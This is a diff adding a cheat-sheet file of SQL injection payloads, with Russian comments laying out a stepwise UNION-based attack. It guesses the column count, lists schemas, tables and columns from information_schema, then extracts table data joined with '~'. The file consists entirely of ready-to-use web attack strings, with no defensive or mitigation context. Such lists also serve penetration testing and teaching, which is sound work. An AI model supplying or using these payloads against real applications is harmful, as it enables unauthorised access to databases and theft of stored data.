@@ -1,0 +1,42 @@
+-- Step 1: Получение списка схем в базе данных (1 столбец)
+' UNION SELECT schema_name FROM information_schema.schemata -- -
+" UNION SELECT schema_name FROM information_schema.schemata -- -
+
+-- Step 2: Получение списка схем в базе данных (2 столбца)
+' UNION SELECT schema_name, NULL FROM information_schema.schemata -- -
+" UNION SELECT schema_name, NULL FROM information_schema.schemata -- -
+
+-- Step 3: Получение списка схем в базе данных (3 столбца)
+' UNION SELECT schema_name, NULL, NULL FROM information_schema.schemata -- -
+" UNION SELECT schema_name, NULL, NULL FROM information_schema.schemata -- -
+
+-- Step 4: Получение списка схем в базе данных (4 столбца)
+' UNION SELECT schema_name, NULL, NULL, NULL FROM information_schema.schemata -- -
+" UNION SELECT schema_name, NULL, NULL, NULL FROM information_schema.schemata -- -
+
+
+-- Step 2: Получение списка таблиц в базе данных
+-- Здесь мы получаем список таблиц для определенной схемы (например, 'your_database').
+' UNION SELECT table_name, NULL FROM information_schema.tables WHERE table_schema = 'your_database' -- -
+" UNION SELECT table_name, NULL FROM information_schema.tables WHERE table_schema = 'your_database' -- -
+' UNION SELECT table_name, NULL FROM information_schema.tables -- -
+" UNION SELECT table_name, NULL FROM information_schema.tables -- -
+
+
+-- Step 3: Получение списка столбцов в таблице
+-- Теперь мы можем получить список столбцов для конкретной таблицы (например, 'your_table').
+' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = 'your_table' -- -
+" UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = 'your_table' -- -
+
+-- Step 4: Получение данных из таблицы
+-- Если мы знаем, что таблица имеет два столбца, например, column1 и column2, можно выполнить запрос для извлечения данных.
+' UNION SELECT column1, column2 FROM your_table -- -
+" UNION SELECT column1, column2 FROM your_table -- -
+
+' UNION SELECT NULL,column1 || '~' || column2 FROM your_table--
+" UNION SELECT NULL,column1 || '~' || column2 FROM your_table--
+
+
+' UNION SELECT NULL, table_name FROM information_schema.tables -- -
+' UNION SELECT NULL,column1 || '~' || column2 FROM your_table--
+" UNION SELECT NULL,column1 || '~' || column2 FROM your_table--
